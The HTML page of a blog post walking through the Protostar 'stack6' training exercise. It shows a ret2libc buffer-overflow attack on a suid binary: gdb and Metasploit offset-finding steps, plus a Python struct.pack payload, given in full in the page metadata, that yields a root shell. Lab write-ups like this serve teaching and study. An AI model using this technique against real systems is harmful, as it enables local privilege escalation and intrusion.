<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Buffer Overflow Practical Examples , ret2libc - protostar stack6 | 0xRick Owned Root !</title>
<meta name="generator" content="Jekyll v3.7.4" />
<meta property="og:title" content="Buffer Overflow Practical Examples , ret2libc - protostar stack6" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Introduction Hey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that’s what we are going to discuss today with protostar - stack6. Without wasting more time let’s jump right in ! Read the previous posts if you haven’t yet. ./stack6 As always we are given the source code of the binary : #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void getpath() { char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\n&quot;, ret); _exit(1); } printf(&quot;got path %s\n&quot;, buffer); } int main(int argc, char **argv) { getpath(); } What this code is doing is just printing input path please: then it stores our input in a buffer of 64 chars and finally it prints it out: Our problem is this if statement : if((ret &amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\n&quot;, ret); _exit(1); } This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the previous example. We can defeat this by a technique called ret2libc. ret2libc So what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function system() and make it execute /bin/sh. (Read about system() here). We will also need to use the function exit() to make the program exit cleanly. (Read about exit() here). So finally our attack payload will be : “padding –&gt; address of system() –&gt; address of exit() –&gt; /bin/sh” instead of : “padding –&gt; new return address –&gt; NOP –&gt; shellcode”. Now let’s see how will we do it. Exploiation Again , this will execute /bin/sh as root because this binary is an suid binary. If it wasn’t suid we would get a shell as the same user. We can check by using find : find /opt/protostar/bin/ -perm -4000 | grep stack6 As you can see stack6 is an suid binary. So first of all , after we call system() we will need to give it /bin/sh , how will we do that ? A nice way to do it is to store /bin/sh in an environment variable. I created a variable and called it SHELL : Now we need to find the address of that variable , we can do it from gdb by setting a breakpoint at main , then running the program and doing this : x/s *((char **)environ+x) where x is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of SHELL But I found a better way to do it when I was reading an article on shellblade. We will use a c program to tell us the estimated address. Code : #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; int main(int argc, char **argv) { char *ptr = getenv(&quot;SHELL&quot;); if (ptr != NULL) { printf(&quot;Estimated address: %p\n&quot;, ptr); return 0; } } Then we will compile it : gcc address.c -o address : As you can see it’s telling us the address of the environment variable SHELL. Now keep in mind that this is not the “exact” address and we will need to go up and down to get the right address. Let’s start by finding the offset. As we did before we will use pattern_create.rb and pattern_offset.rb from metasploit exploitation tools. ./pattern_create.rb -l 100 We have our pattern now let’s run the program in gdb and set a breakpoint before main break *main. Then we will type c to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen : We got the address 0x37634136 , now let’s go back and use pattern_offset.rb : ./pattern_offset.rb -q 0x37634136 So after 80 chars the buffer overflows. Next thing to check is the addresses of system() and exit(). From gdb we will set a break point at main and type r to run the program. After it reaches the break point and breaks we can get the address of system by typing p system and we will do the same thing for exit p exit : Address of system : 0xb7ecffb0 Address of exit : 0xb7ec60c0 Lastly we will check the address of SHELL again because it’s subject to change : Address : 0xbffff985 Let’s check our notes : Ok , we are ready to write our exploit , we will use struct import struct like we did before. We will create a variable for the chars we will use to fill the buffer and call it buffer , its value will be 80 A’s. buffer = &quot;A&quot; * 80 Then we will create 3 variables to hold the addresses of system() , exit() and SHELL. We will use struct to reverse the addresses. system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) And finally we will print the payload. print buffer + system + exit + shell Final script : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) print buffer + system + exit + shell We have to remember that the address of SHELL is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. python /tmp/stack6.py &gt; /tmp/payload , Then we will cat the file and pipe the output to ./stack6 : And no shell , After going up and down by editing the address in the python script I finally got the right address which is 0xbffff992 : python /tmp/stack6.py &gt; /tmp/payload cat /tmp/payload - | ./stack6 root shell! So after editing the address of shell variable , the script will be like this : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff992) print buffer + system + exit + shell That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5" />
<meta property="og:description" content="Introduction Hey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that’s what we are going to discuss today with protostar - stack6. Without wasting more time let’s jump right in ! Read the previous posts if you haven’t yet. ./stack6 As always we are given the source code of the binary : #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void getpath() { char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\n&quot;, ret); _exit(1); } printf(&quot;got path %s\n&quot;, buffer); } int main(int argc, char **argv) { getpath(); } What this code is doing is just printing input path please: then it stores our input in a buffer of 64 chars and finally it prints it out: Our problem is this if statement : if((ret &amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\n&quot;, ret); _exit(1); } This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the previous example. We can defeat this by a technique called ret2libc. ret2libc So what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function system() and make it execute /bin/sh. (Read about system() here). We will also need to use the function exit() to make the program exit cleanly. (Read about exit() here). So finally our attack payload will be : “padding –&gt; address of system() –&gt; address of exit() –&gt; /bin/sh” instead of : “padding –&gt; new return address –&gt; NOP –&gt; shellcode”. Now let’s see how will we do it. Exploiation Again , this will execute /bin/sh as root because this binary is an suid binary. If it wasn’t suid we would get a shell as the same user. We can check by using find : find /opt/protostar/bin/ -perm -4000 | grep stack6 As you can see stack6 is an suid binary. So first of all , after we call system() we will need to give it /bin/sh , how will we do that ? A nice way to do it is to store /bin/sh in an environment variable. I created a variable and called it SHELL : Now we need to find the address of that variable , we can do it from gdb by setting a breakpoint at main , then running the program and doing this : x/s *((char **)environ+x) where x is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of SHELL But I found a better way to do it when I was reading an article on shellblade. We will use a c program to tell us the estimated address. Code : #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; int main(int argc, char **argv) { char *ptr = getenv(&quot;SHELL&quot;); if (ptr != NULL) { printf(&quot;Estimated address: %p\n&quot;, ptr); return 0; } } Then we will compile it : gcc address.c -o address : As you can see it’s telling us the address of the environment variable SHELL. Now keep in mind that this is not the “exact” address and we will need to go up and down to get the right address. Let’s start by finding the offset. As we did before we will use pattern_create.rb and pattern_offset.rb from metasploit exploitation tools. ./pattern_create.rb -l 100 We have our pattern now let’s run the program in gdb and set a breakpoint before main break *main. Then we will type c to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen : We got the address 0x37634136 , now let’s go back and use pattern_offset.rb : ./pattern_offset.rb -q 0x37634136 So after 80 chars the buffer overflows. Next thing to check is the addresses of system() and exit(). From gdb we will set a break point at main and type r to run the program. After it reaches the break point and breaks we can get the address of system by typing p system and we will do the same thing for exit p exit : Address of system : 0xb7ecffb0 Address of exit : 0xb7ec60c0 Lastly we will check the address of SHELL again because it’s subject to change : Address : 0xbffff985 Let’s check our notes : Ok , we are ready to write our exploit , we will use struct import struct like we did before. We will create a variable for the chars we will use to fill the buffer and call it buffer , its value will be 80 A’s. buffer = &quot;A&quot; * 80 Then we will create 3 variables to hold the addresses of system() , exit() and SHELL. We will use struct to reverse the addresses. system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) And finally we will print the payload. print buffer + system + exit + shell Final script : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) print buffer + system + exit + shell We have to remember that the address of SHELL is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. python /tmp/stack6.py &gt; /tmp/payload , Then we will cat the file and pipe the output to ./stack6 : And no shell , After going up and down by editing the address in the python script I finally got the right address which is 0xbffff992 : python /tmp/stack6.py &gt; /tmp/payload cat /tmp/payload - | ./stack6 root shell! So after editing the address of shell variable , the script will be like this : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff992) print buffer + system + exit + shell That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5" />
<link rel="canonical" href="http://localhost:4000/binary-exploitation/bof6/" />
<meta property="og:url" content="http://localhost:4000/binary-exploitation/bof6/" />
<meta property="og:site_name" content="0xRick Owned Root !" />
<meta property="og:image" content="http://localhost:4000/binary-exploitation/BOF6/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-03-20T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"Introduction Hey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that’s what we are going to discuss today with protostar - stack6. Without wasting more time let’s jump right in ! Read the previous posts if you haven’t yet. ./stack6 As always we are given the source code of the binary : #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void getpath() { char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\\n&quot;, ret); _exit(1); } printf(&quot;got path %s\\n&quot;, buffer); } int main(int argc, char **argv) { getpath(); } What this code is doing is just printing input path please: then it stores our input in a buffer of 64 chars and finally it prints it out: Our problem is this if statement : if((ret &amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\\n&quot;, ret); _exit(1); } This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the previous example. We can defeat this by a technique called ret2libc. ret2libc So what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function system() and make it execute /bin/sh. (Read about system() here). We will also need to use the function exit() to make the program exit cleanly. (Read about exit() here). So finally our attack payload will be : “padding –&gt; address of system() –&gt; address of exit() –&gt; /bin/sh” instead of : “padding –&gt; new return address –&gt; NOP –&gt; shellcode”. Now let’s see how will we do it. Exploiation Again , this will execute /bin/sh as root because this binary is an suid binary. If it wasn’t suid we would get a shell as the same user. We can check by using find : find /opt/protostar/bin/ -perm -4000 | grep stack6 As you can see stack6 is an suid binary. So first of all , after we call system() we will need to give it /bin/sh , how will we do that ? A nice way to do it is to store /bin/sh in an environment variable. I created a variable and called it SHELL : Now we need to find the address of that variable , we can do it from gdb by setting a breakpoint at main , then running the program and doing this : x/s *((char **)environ+x) where x is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of SHELL But I found a better way to do it when I was reading an article on shellblade. We will use a c program to tell us the estimated address. Code : #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; int main(int argc, char **argv) { char *ptr = getenv(&quot;SHELL&quot;); if (ptr != NULL) { printf(&quot;Estimated address: %p\\n&quot;, ptr); return 0; } } Then we will compile it : gcc address.c -o address : As you can see it’s telling us the address of the environment variable SHELL. Now keep in mind that this is not the “exact” address and we will need to go up and down to get the right address. Let’s start by finding the offset. As we did before we will use pattern_create.rb and pattern_offset.rb from metasploit exploitation tools. ./pattern_create.rb -l 100 We have our pattern now let’s run the program in gdb and set a breakpoint before main break *main. Then we will type c to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen : We got the address 0x37634136 , now let’s go back and use pattern_offset.rb : ./pattern_offset.rb -q 0x37634136 So after 80 chars the buffer overflows. Next thing to check is the addresses of system() and exit(). From gdb we will set a break point at main and type r to run the program. After it reaches the break point and breaks we can get the address of system by typing p system and we will do the same thing for exit p exit : Address of system : 0xb7ecffb0 Address of exit : 0xb7ec60c0 Lastly we will check the address of SHELL again because it’s subject to change : Address : 0xbffff985 Let’s check our notes : Ok , we are ready to write our exploit , we will use struct import struct like we did before. We will create a variable for the chars we will use to fill the buffer and call it buffer , its value will be 80 A’s. buffer = &quot;A&quot; * 80 Then we will create 3 variables to hold the addresses of system() , exit() and SHELL. We will use struct to reverse the addresses. system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) And finally we will print the payload. print buffer + system + exit + shell Final script : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) print buffer + system + exit + shell We have to remember that the address of SHELL is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. python /tmp/stack6.py &gt; /tmp/payload , Then we will cat the file and pipe the output to ./stack6 : And no shell , After going up and down by editing the address in the python script I finally got the right address which is 0xbffff992 : python /tmp/stack6.py &gt; /tmp/payload cat /tmp/payload - | ./stack6 root shell! So after editing the address of shell variable , the script will be like this : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff992) print buffer + system + exit + shell That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5","@type":"BlogPosting","url":"http://localhost:4000/binary-exploitation/bof6/","image":"http://localhost:4000/binary-exploitation/BOF6/0.png","headline":"Buffer Overflow Practical Examples , ret2libc - protostar stack6","dateModified":"2019-03-20T00:00:00+02:00","datePublished":"2019-03-20T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/binary-exploitation/bof6/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/tagbuttons.css">
  <link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Buffer Overflow Practical Examples , ret2libc - protostar stack6</h1>
    <p class="post-meta">
      <h7>
        Tags: 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Linux/';">Linux</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Binary Exploitation/';">Binary Exploitation</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Exploit Development/';">Exploit Development</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Buffer Overflow/';">Buffer Overflow</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/c/';">c</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Python/';">Python</button> 
        
      </h7>
      <br>
      <time class="dt-published" datetime="2019-03-20T00:00:00+02:00" itemprop="datePublished">Mar 20, 2019
      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
</p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <hr />

<h3 id="introduction">Introduction</h3>
<h4 id="hey-guys--in-the-last-post-about-buffer-overflow-we-exploited-a-buffer-overflow-vulnerability-where-we-were-able-to-inject-a-shellcode-and-escalate-privileges-to-root-but-that-was-possible-because-we-were-able-to-overwrite-the-return-address-to-another-address-on-the-stack-where-we-placed-our-shellcode--but-what-if-the-stack-is-non-executable--we-will-perform-an-attack-called-ret2libc-and-thats-what-we-are-going-to-discuss-today-with-protostar---stack6-without-wasting-more-time-lets-jump-right-in-">Hey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that’s what we are going to discuss today with protostar - stack6. Without wasting more time let’s jump right in !</h4>
<h4 id="read-the-previous-posts-if-you-havent-yet">Read the <a href="/categories/#binary-exploitation">previous posts</a> if you haven’t yet.</h4>
<p><img src="/images/binary-exploitation/BOF6/0.png" alt="" /></p>
<hr />

<h3 id="stack6">./stack6</h3>
<h4 id="as-always-we-are-given-the-source-code-of-the-binary-">As always we are given the source code of the binary :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void getpath()
{
        char buffer[64];
        unsigned int ret;

        printf("input path please: "); fflush(stdout);

        gets(buffer);

        ret = __builtin_return_address(0);

        if((ret &amp; 0xbf000000) == 0xbf000000) {
                printf("bzzzt (%p)\n", ret);
                _exit(1);
        }

        printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
        getpath();



}
</code></pre></div></div>
<h4 id="what-this-code-is-doing-is-just-printing-input-path-please-then-it-stores-our-input-in-a-buffer-of-64-chars-and-finally-it-prints-it-out">What this code is doing is just printing <code class="highlighter-rouge">input path please:</code> then it stores our input in a buffer of 64 chars and finally it prints it out:</h4>
<p><img src="/images/binary-exploitation/BOF6/1.png" alt="" /></p>
<h4 id="our-problem-is-this-if-statement-">Our problem is this <code class="highlighter-rouge">if</code> statement :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        if((ret &amp; 0xbf000000) == 0xbf000000) {
                printf("bzzzt (%p)\n", ret);
                _exit(1);
        }
</code></pre></div></div>
<h4 id="this-is-making-sure-that-the-return-address-is-not-on-the-stack--which-makes-it-not-possible-to-perform-a-shellcode-injection-like-we-did-in-the-previous-example-we-can-defeat-this-by-a-technique-called-ret2libc">This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the <a href="/binary-exploitation/bof5/">previous example</a>. We can defeat this by a technique called ret2libc.</h4>
<p><br /></p>
<hr />

<h3 id="ret2libc">ret2libc</h3>
<h4 id="so-what-is-ret2libc--if-we-take-the-word-itself--ret-is-return--2-means-to-and-libc-is-the-c-library-the-idea-behind-ret2libc-is-instead-of-injecting-shellcode-and-jumping-to-the-address-that-holds-that-shellcode-we-can-use-the-functions-that-are-already-in-the-c-library-for-example-we-can-call-the-function-system-and-make-it-execute-binsh-read-about-system-here-we-will-also-need-to-use-the-function-exit-to-make-the-program-exit-cleanly-read-about-exit-here">So what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function <code class="highlighter-rouge">system()</code> and make it execute <code class="highlighter-rouge">/bin/sh</code>. (Read about <code class="highlighter-rouge">system()</code> <a href="https://www.tutorialspoint.com/c_standard_library/c_function_system.htm">here</a>). We will also need to use the function <code class="highlighter-rouge">exit()</code> to make the program exit cleanly. (Read about <code class="highlighter-rouge">exit()</code> <a href="https://www.tutorialspoint.com/c_standard_library/c_function_exit.htm">here</a>).</h4>
<h4 id="so-finally-our-attack-payload-will-be--padding--address-of-system--address-of-exit--binsh-instead-of--padding--new-return-address--nop--shellcode">So finally our attack payload will be : “padding –&gt; address of <code class="highlighter-rouge">system()</code> –&gt; address of <code class="highlighter-rouge">exit()</code> –&gt; <code class="highlighter-rouge">/bin/sh</code>” instead of : “padding –&gt; new return address –&gt; NOP –&gt; shellcode”.</h4>
<h4 id="now-lets-see-how-will-we-do-it">Now let’s see how will we do it.</h4>
<p><br /></p>
<hr />

<h3 id="exploiation">Exploiation</h3>
<h4 id="again--this-will-execute-binsh-as-root-because-this-binary-is-an-suid-binary-if-it-wasnt-suid-we-would-get-a-shell-as-the-same-user-we-can-check-by-using-find-">Again , this will execute <code class="highlighter-rouge">/bin/sh</code> as root because this binary is an <code class="highlighter-rouge">suid</code> binary. If it wasn’t <code class="highlighter-rouge">suid</code> we would get a shell as the same user. We can check by using <code class="highlighter-rouge">find</code> :</h4>
<p><code class="highlighter-rouge">find /opt/protostar/bin/ -perm -4000 | grep stack6</code>
<img src="/images/binary-exploitation/BOF6/2.png" alt="" /></p>
<h4 id="as-you-can-see-stack6-is-an-suid-binary">As you can see <code class="highlighter-rouge">stack6</code> is an <code class="highlighter-rouge">suid</code> binary.</h4>
<h4 id="so-first-of-all--after-we-call-system-we-will-need-to-give-it-binsh--how-will-we-do-that--a-nice-way-to-do-it-is-to-store-binsh-in-an-environment-variable-i-created-a-variable-and-called-it-shell-">So first of all , after we call <code class="highlighter-rouge">system()</code> we will need to give it <code class="highlighter-rouge">/bin/sh</code> , how will we do that ? A nice way to do it is to store <code class="highlighter-rouge">/bin/sh</code> in an environment variable. I created a variable and called it <code class="highlighter-rouge">SHELL</code> :</h4>
<p><img src="/images/binary-exploitation/BOF6/3.png" alt="" /></p>
<h4 id="now-we-need-to-find-the-address-of-that-variable--we-can-do-it-from-gdb-by-setting-a-breakpoint-at-main--then-running-the-program-and-doing-this--xs-char-environx-where-x-is-a-number--this-will-print-the-address-of-an-environment-variable-we-will-keep-trying-numbers-until-we-get-the-address-of-shell">Now we need to find the address of that variable , we can do it from <code class="highlighter-rouge">gdb</code> by setting a breakpoint at main , then running the program and doing this : <code class="highlighter-rouge">x/s *((char **)environ+x)</code> where <code class="highlighter-rouge">x</code> is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of <code class="highlighter-rouge">SHELL</code></h4>
<h4 id="but-i-found-a-better-way-to-do-it-when-i-was-reading-an-article-on-shellblade-we-will-use-a-c-program-to-tell-us-the-estimated-address">But I found a better way to do it when I was reading an article on <a href="https://www.shellblade.net/">shellblade</a>. We will use a <code class="highlighter-rouge">c</code> program to tell us the estimated address.</h4>
<h4 id="code-">Code :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
int main(int argc, char **argv)
{
        char *ptr = getenv("SHELL");
        if (ptr != NULL)
        {
                printf("Estimated address: %p\n", ptr);
                return 0;
        }
}
</code></pre></div></div>
<p><img src="/images/binary-exploitation/BOF6/4.png" alt="" /></p>
<h4 id="then-we-will-compile-it--gcc-addressc--o-address-">Then we will compile it : <code class="highlighter-rouge">gcc address.c -o address</code> :</h4>
<p><img src="/images/binary-exploitation/BOF6/5.png" alt="" /></p>
<h4 id="as-you-can-see-its-telling-us-the-address-of-the-environment-variable-shell-now-keep-in-mind-that-this-is-not-the-exact-address-and-we-will-need-to-go-up-and-down-to-get-the-right-address">As you can see it’s telling us the address of the environment variable <code class="highlighter-rouge">SHELL</code>. Now keep in mind that this is not the “exact” address and we will need to go up and down to get the right address.</h4>
<h4 id="lets-start-by-finding-the-offset-as-we-did-before-we-will-use-pattern_createrb-and-pattern_offsetrb-from-metasploit-exploitation-tools">Let’s start by finding the offset. As we did before we will use <code class="highlighter-rouge">pattern_create.rb</code> and <code class="highlighter-rouge">pattern_offset.rb</code> from metasploit exploitation tools.</h4>
<p><code class="highlighter-rouge">./pattern_create.rb -l 100</code>
<img src="/images/binary-exploitation/BOF6/6.png" alt="" /></p>
<h4 id="we-have-our-pattern-now-lets-run-the-program-in-gdb-and-set-a-breakpoint-before-main-break-main-then-we-will-type-c-to-continue-and-paste-the-pattern-the-buffer-will-overflow-and-we-will-see-exactly-where-did-the-overflow-happen-">We have our pattern now let’s run the program in gdb and set a breakpoint before main <code class="highlighter-rouge">break *main</code>. Then we will type <code class="highlighter-rouge">c</code> to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen :</h4>
<p><img src="/images/binary-exploitation/BOF6/7.png" alt="" /></p>
<h4 id="we-got-the-address-0x37634136--now-lets-go-back-and-use-pattern_offsetrb-">We got the address <code class="highlighter-rouge">0x37634136</code> , now let’s go back and use <code class="highlighter-rouge">pattern_offset.rb</code> :</h4>
<p><code class="highlighter-rouge">./pattern_offset.rb -q 0x37634136</code>
<img src="/images/binary-exploitation/BOF6/8.png" alt="" /></p>
<h4 id="so-after-80-chars-the-buffer-overflows-next-thing-to-check-is-the-addresses-of-system-and-exit-from-gdb-we-will-set-a-break-point-at-main-and-type-r-to-run-the-program-after-it-reaches-the-break-point-and-breaks-we-can-get-the-address-of-system-by-typing-p-system-and-we-will-do-the-same-thing-for-exit-p-exit-">So after 80 chars the buffer overflows. Next thing to check is the addresses of <code class="highlighter-rouge">system()</code> and <code class="highlighter-rouge">exit()</code>. From gdb we will set a break point at main and type <code class="highlighter-rouge">r</code> to run the program. After it reaches the break point and breaks we can get the address of system by typing <code class="highlighter-rouge">p system</code> and we will do the same thing for exit <code class="highlighter-rouge">p exit</code> :</h4>
<p><img src="/images/binary-exploitation/BOF6/9.png" alt="" /></p>
<h4 id="address-of-system--0xb7ecffb0">Address of system : <code class="highlighter-rouge">0xb7ecffb0</code></h4>
<h4 id="address-of-exit--0xb7ec60c0">Address of exit : <code class="highlighter-rouge">0xb7ec60c0</code></h4>
<h4 id="lastly-we-will-check-the-address-of-shell-again-because-its-subject-to-change-">Lastly we will check the address of <code class="highlighter-rouge">SHELL</code> again because it’s subject to change :</h4>
<p><img src="/images/binary-exploitation/BOF6/10.png" alt="" /></p>
<h4 id="address--0xbffff985">Address : <code class="highlighter-rouge">0xbffff985</code></h4>
<h4 id="lets-check-our-notes-">Let’s check our notes :</h4>
<p><img src="/images/binary-exploitation/BOF6/11.png" alt="" /></p>
<h4 id="ok--we-are-ready-to-write-our-exploit--we-will-use-struct-import-struct-like-we-did-before-we-will-create-a-variable-for-the-chars-we-will-use-to-fill-the-buffer-and-call-it-buffer--its-value-will-be-80-as">Ok , we are ready to write our exploit , we will use struct <code class="highlighter-rouge">import struct</code> like we did before. We will create a variable for the chars we will use to fill the buffer and call it <code class="highlighter-rouge">buffer</code> , its value will be 80 A’s.</h4>
